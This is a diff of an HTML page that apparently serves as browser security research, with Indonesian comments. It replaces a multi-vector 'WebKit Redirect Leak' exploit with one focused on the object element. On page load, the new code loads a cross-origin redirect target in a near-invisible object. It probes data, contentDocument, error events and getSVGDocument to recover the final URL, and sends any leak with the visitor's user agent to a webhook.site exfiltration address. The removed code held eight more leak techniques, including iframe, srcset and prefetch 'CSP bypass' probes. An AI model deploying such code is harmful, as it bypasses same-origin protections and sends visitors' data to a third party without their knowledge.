@@ -4,211 +4,142 @@
 <head>
     <meta charset='utf-8' />
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebKit Redirect Leak Analyser - Putra Mahardika</title>
+    <title>Object-Only Leak Research - Putra Mahardika</title>
     <style>
         body {
             font-family: 'Courier New', monospace;
-            background: #050505;
+            background: #080808;
             color: #00ff41;
             padding: 20px;
-            line-height: 1.2;
         }
 
         .container {
-            border: 1px dashed #00ff41;
-            padding: 20px;
-            border-radius: 4px;
-            box-shadow: 0 0 15px rgba(0, 255, 65, 0.2);
-            max-width: 1000px;
-            margin: auto;
+            border: 1px solid #00ff41;
+            padding: 15px;
+            box-shadow: 0 0 15px #00ff4133;
         }
 
-        h2 {
-            border-bottom: 2px solid #00ff41;
-            padding-bottom: 5px;
-            color: #fff;
-            text-shadow: 2px 2px #222;
-        }
-
-        .log-container {
-            background: #000;
-            border: 1px solid #333;
+        .leak-box {
+            background: rgba(255, 0, 0, 0.1);
+            border: 1px solid #ff3e3e;
             padding: 10px;
-            height: 400px;
-            overflow-y: auto;
-            margin-top: 15px;
-            display: flex;
-            flex-direction: column-reverse;
-        }
-
-        .log-item {
-            margin-bottom: 4px;
-            font-size: 11px;
-            border-left: 2px solid #444;
-            padding-left: 8px;
-        }
-
-        .leak {
+            margin-top: 10px;
             color: #ff3e3e;
             font-weight: bold;
-            background: rgba(255, 62, 62, 0.15);
-            border-left: 3px solid #ff3e3e;
-            padding: 2px 8px;
-            animation: flicker 0.5s infinite;
         }
 
-        @keyframes flicker {
-            0% { opacity: 1; }
-            50% { opacity: 0.8; }
-            100% { opacity: 1; }
+        .log {
+            font-size: 12px;
+            margin-top: 10px;
+            color: #aaa;
         }
 
-        .tag {
-            background: #333;
-            padding: 1px 4px;
-            border-radius: 2px;
-            margin-right: 5px;
-            font-size: 10px;
-            color: #3498db;
-        }
-
-        #status { color: #f1c40f; margin-top: 10px; font-weight: bold; }
+        .target-info { color: #3498db; margin-bottom: 20px; }
     </style>
 </head>
 
 <body>
     <div class="container">
-        <h2>[!] WebKit Redirect Leak Researcher</h2>
-        <div id="status">[*] System Ready. Waiting for trigger...</div>
-        <p style="font-size: 11px;">Target: <span id="target_display" style="color:#aaa;"></span></p>
-        <div class="log-container" id="logs"></div>
+        <h2>[!] Focus Vector: HTMLObjectElement</h2>
+        <div class="target-info">
+            Target: <span id="target_url"></span><br>
+            Exfil: <span id="exfil_url" style="font-size: 10px;"></span>
+        </div>
+        <div id="status">[*] Initializing Object Monitor...</div>
+        <div id="display"></div>
+        <div id="logs" class="log"></div>
     </div>
 
     <script>
-        // --- CONFIGURATION ---
         const CONFIG = {
-            // Menggunakan httpbin agar redirect-nya terlihat jelas dan tidak kena blokir WAF agresif di awal
             target: 'https://httpbin.org/redirect-to?url=https://www.google.com/&status_code=302',
-            exfil: 'https://webhook.site/0d95c87e-8a54-4bb1-b4cf-964eecdb5594',
-            myOrigin: window.location.origin
+            exfil: 'https://webhook.site/0d95c87e-8a54-4bb1-b4cf-964eecdb5594'
         };
 
-        document.getElementById('target_display').innerText = CONFIG.target;
+        document.getElementById('target_url').innerText = CONFIG.target;
+        document.getElementById('exfil_url').innerText = CONFIG.exfil;
 
-        // --- ENGINE ---
-        function log(msg, isLeak = false) {
+        function report(data, detail) {
             const div = document.createElement('div');
-            div.className = isLeak ? 'log-item leak' : 'log-item';
-            div.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
-            document.getElementById('logs').prepend(div);
-            console.log(msg);
-        }
-
-        function report(data, method) {
-            // Filter: Jangan report target awal atau origin sendiri
-            if (!data || data === CONFIG.target || data === CONFIG.myOrigin + '/') return;
-            
-            log(`<span class="tag">${method}</span> LEAK DETECTED: ${data}`, true);
+            div.className = 'leak-box';
+            div.innerText = `[LEAK] ${detail}: ${data}`;
+            document.getElementById('display').prepend(div);
 
             navigator.sendBeacon(CONFIG.exfil, JSON.stringify({
-                method: method,
-                leaked_url: data,
-                ua: navigator.userAgent,
-                timestamp: new Date().toISOString()
+                vector: 'Object-Element',
+                type: detail,
+                data: data,
+                ua: navigator.userAgent
             }));
         }
 
-        async function startExploit() {
-            log("[*] Initializing multi-vector hybrid analysis...");
-
-            // 1. Resource Timing (Macrotask)
-            const observer = new PerformanceObserver((list) => {
-                list.getEntries().forEach((entry) => {
-                    if (entry.name.startsWith('http') && entry.name !== CONFIG.target) {
-                        report(entry.name, 'Resource-Timing');
-                    }
-                });
-            });
-            observer.observe({ entryTypes: ['resource'] });
-
-            // 2. Fetch Timing Attack & Error Leak (Microtask)
-            const tStart = performance.now();
-            fetch(CONFIG.target, { mode: 'no-cors', cache: 'no-cache' })
-                .then(r => {
-                    const dur = performance.now() - tStart;
-                    log(`[*] Fetch completed in ${dur.toFixed(2)}ms`);
-                    if (r.url && r.url !== CONFIG.target) report(r.url, 'Fetch-ResponseURL');
-                })
-                .catch(err => {
-                    const match = err.message.match(/https?:\/\/[^\s]+/);
-                    if (match) report(match[0], 'Fetch-Error-String');
-                });
-
-            // 3. Audio Metadata Leak (WebKit Specific)
-            const audio = new Audio();
-            audio.src = CONFIG.target;
-            audio.onloadedmetadata = () => {
-                if (audio.currentSrc && audio.currentSrc !== CONFIG.target) {
-                    report(audio.currentSrc, 'Audio-Metadata');
-                }
-            };
-
-            // 4. Object & Embed Bypass
-            const obj = document.createElement('object');
-            obj.data = CONFIG.target;
-            obj.width = 0; obj.height = 0;
-            obj.onload = () => { try { if(obj.data !== CONFIG.target) report(obj.data, 'Object-Attr'); } catch(e){} };
-            document.body.appendChild(obj);
-
-            const emb = document.createElement('embed');
-            emb.src = CONFIG.target;
-            emb.style.visibility = 'hidden';
-            document.body.appendChild(emb);
-
-            // 5. Link Prefetch (CSP Bypass)
-            const link = document.createElement('link');
-            link.rel = 'prefetch';
-            link.href = CONFIG.target;
-            document.head.appendChild(link);
-
-            // 6. CSP Violation Reporting
-            document.addEventListener('securitypolicyviolation', (e) => {
-                if (e.blockedURI && e.blockedURI !== 'inline' && e.blockedURI !== 'about') {
-                    report(e.blockedURI, 'CSP-Violation');
-                }
-            });
-
-            // 7. Image Srcset Leak
-            const img = new Image();
-            img.srcset = `${CONFIG.target} 2x`;
-            img.onerror = () => {
-                if (img.currentSrc && img.currentSrc !== CONFIG.target) {
-                    report(img.currentSrc, 'Img-Srcset');
-                }
-            };
-            
-            // 8. Iframe Shadow Leak
-            const ifr = document.createElement('iframe');
-            ifr.style.display = 'none';
-            ifr.src = CONFIG.target;
-            ifr.onload = () => {
-                try {
-                    const leak = ifr.contentWindow.location.href;
-                    if(leak && leak !== 'about:blank') report(leak, 'Iframe-Location');
-                } catch(e) {}
-            };
-            document.body.appendChild(ifr);
+        function log(msg) {
+            const l = document.getElementById('logs');
+            l.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
         }
 
-        // --- TRIGGER ---
-        window.onload = () => {
-            document.getElementById('status').innerText = "[+] Analysing... Check Webhook!";
-            document.getElementById('status').style.color = "#00ff41";
+        function runObjectExploit() {
+            log("Creating Object element...");
             
-            // Menggunakan requestAnimationFrame untuk memastikan DOM siap di WebKit
-            requestAnimationFrame(() => {
-                setTimeout(startExploit, 500);
-            });
+            const obj = document.createElement('object');
+            
+            // Kita set ukuran 1x1 agar tetap ter-render oleh engine tapi gak ganggu UI
+            obj.width = "1";
+            obj.height = "1";
+            obj.style.opacity = "0.1"; 
+
+            // 1. Monitor Properti 'data' (Bypass Check)
+            // Di beberapa versi WebKit, properti 'data' bisa ter-update otomatis ke URL final
+            let checkInterval = setInterval(() => {
+                try {
+                    if (obj.data && obj.data !== CONFIG.target && !obj.data.startsWith('about:')) {
+                        report(obj.data, "Object-Data-Property-Update");
+                        clearInterval(checkInterval);
+                    }
+                } catch(e) {}
+            }, 100);
+
+            // 2. OnLoad Trigger
+            obj.onload = () => {
+                log("Object fired 'onload' event.");
+                try {
+                    // Mencoba akses sub-document (Akan gagal di SOP normal)
+                    const leak = obj.contentDocument.location.href;
+                    if(leak) report(leak, "ContentDocument-Location-Leak");
+                } catch(e) {
+                    log("SOP blocked contentDocument access (Normal).");
+                }
+            };
+
+            // 3. OnError Trigger (Kadang pesan error bocor)
+            obj.onerror = (err) => {
+                log("Object fired 'onerror'.");
+                // Cek jika error event membawa info source
+                if(err && err.target && err.target.data !== CONFIG.target) {
+                    report(err.target.data, "Error-Event-Source-Leak");
+                }
+            };
+
+            // 4. SVG Document Leak (Spesifik WebKit)
+            try {
+                const svgDoc = obj.getSVGDocument();
+                if(svgDoc) report(svgDoc.URL, "getSVGDocument-Leak");
+            } catch(e) {}
+
+            // Jalankan!
+            obj.data = CONFIG.target;
+            document.body.appendChild(obj);
+
+            // Timeout untuk berhenti memantau
+            setTimeout(() => {
+                clearInterval(checkInterval);
+                log("Monitoring finished.");
+                document.getElementById('status').innerText = "[+] Done. Check Webhook.";
+            }, 5000);
+        }
+
+        window.onload = () => {
+            setTimeout(runObjectExploit, 1000);
         };
     </script>
 </body>
